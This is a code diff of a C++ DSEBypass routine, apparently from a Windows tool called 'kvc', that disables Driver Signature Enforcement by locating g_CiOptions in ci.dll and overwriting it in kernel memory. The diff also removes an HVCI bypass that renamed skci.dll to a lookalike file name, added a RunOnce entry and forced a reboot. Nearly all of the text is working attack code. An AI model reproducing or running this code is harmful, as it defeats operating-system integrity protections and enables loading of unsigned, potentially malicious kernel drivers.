@@ -29,7 +29,7 @@ DSEBypass::DSEBypass(std::unique_ptr<kvc>& rtc, TrustedInstallerIntegrator* trus
 bool DSEBypass::DisableDSE() noexcept {
     DEBUG(L"Attempting to disable Driver Signature Enforcement...");
     
-    // Step 1: Find ci.dll base address
+    // Find ci.dll kernel module base address
     auto ciBase = GetKernelModuleBase("ci.dll");
     if (!ciBase) {
         ERROR(L"Failed to locate ci.dll");
@@ -38,7 +38,7 @@ bool DSEBypass::DisableDSE() noexcept {
     
     DEBUG(L"ci.dll base: 0x%llX", ciBase.value());
     
-    // Step 2: Locate g_CiOptions in CiPolicy section
+    // Locate g_CiOptions variable in CiPolicy section
     m_ciOptionsAddr = FindCiOptions(ciBase.value());
     if (!m_ciOptionsAddr) {
         ERROR(L"Failed to locate g_CiOptions");
@@ -47,7 +47,7 @@ bool DSEBypass::DisableDSE() noexcept {
     
     DEBUG(L"g_CiOptions address: 0x%llX", m_ciOptionsAddr);
     
-    // Step 3: Read current value
+    // Read current DSE value from kernel memory
     auto current = m_rtc->Read32(m_ciOptionsAddr);
     if (!current) {
         ERROR(L"Failed to read g_CiOptions");
@@ -58,71 +58,26 @@ bool DSEBypass::DisableDSE() noexcept {
     m_originalValue = currentValue;
     DEBUG(L"Current g_CiOptions: 0x%08X", currentValue);
     
-    // Step 4a: Handle already disabled case
+    // Check if DSE is already disabled
     if (currentValue == 0x00000000) {
         INFO(L"DSE already disabled - no action required");
         SUCCESS(L"Kernel accepts unsigned drivers");
         return true;
     }
 
-    // Step 4b: Check for HVCI/VBS - require rename strategy
-    if (currentValue & 0x0001C000) {
-        std::wcout << L"\n";
-        INFO(L"HVCI/VBS protection detected: g_CiOptions = 0x%08X", currentValue);
-        INFO(L"Direct kernel memory patching blocked by hypervisor");
-        INFO(L"Initiating non-invasive HVCI bypass strategy...");
-        std::wcout << L"\n";
-        
-        SUCCESS(L"Secure Kernel module prepared for temporary deactivation");
-        SUCCESS(L"System configuration: skci.dll → skci.dlI (reversible)");
-        INFO(L"No files will be permanently modified or deleted");
-        INFO(L"After reboot: hypervisor disabled, DSE bypass automatic, skci.dll restored");
-        std::wcout << L"\n";
-        
-        if (!RenameSkciLibrary()) {
-            ERROR(L"Failed to rename skci.dll");
-            return false;
-        }
-        
-        if (!SaveDSEState(currentValue)) {
-            ERROR(L"Failed to save DSE state to registry");
-            return false;
-        }
-        
-        if (!CreateRunOnceEntry()) {
-            ERROR(L"Failed to create RunOnce entry");
-            return false;
-        }
-        
-        SUCCESS(L"HVCI bypass prepared successfully");
-        INFO(L"System will disable hypervisor on next boot");
-        INFO(L"Reboot required to complete DSE bypass");
-        INFO(L"After reboot, DSE will be automatically disabled");
-        
-        // Prompt for reboot
-        std::wcout << L"\n";
-        std::wcout << L"Reboot now to complete DSE bypass? [Y/N]: ";
-        wchar_t choice;
-        std::wcin >> choice;
-        
-        if (choice == L'Y' || choice == L'y') {
-            INFO(L"Initiating system reboot...");
-            system("shutdown /r /t 0");
-        }
-        
-        return true;
-    }
+    // HVCI bypass is handled in Controller::DisableDSE() before calling this function
+    // This function only handles standard DSE patching
     
-    // Step 5: Verify we have patchable DSE (0x00000006)
+    // Verify we have patchable DSE value (0x00000006)
     if (currentValue != 0x00000006) {
         INFO(L"Unexpected g_CiOptions value: 0x%08X", currentValue);
-        INFO(L"Expected: 0x00000006 (patchable) or 0x0001C006 (HVCI)");
+        INFO(L"Expected: 0x00000006 (patchable DSE)");
         INFO(L"DSE may already be disabled or system in non-standard configuration");
         INFO(L"Use 'kvc dse' to verify current state");
         return false;
     }
     
-    // Step 6: Disable DSE by clearing bits 1 and 2
+    // Disable DSE by clearing bits 1 and 2
     DWORD newValue = 0x00000000;
     
     if (!m_rtc->Write32(m_ciOptionsAddr, newValue)) {
@@ -130,7 +85,7 @@ bool DSEBypass::DisableDSE() noexcept {
         return false;
     }
     
-    // Step 7: Verify the change
+    // Verify the modification was successful
     auto verify = m_rtc->Read32(m_ciOptionsAddr);
     if (!verify || verify.value() != newValue) {
         ERROR(L"Verification failed (expected: 0x%08X, got: 0x%08X)", 
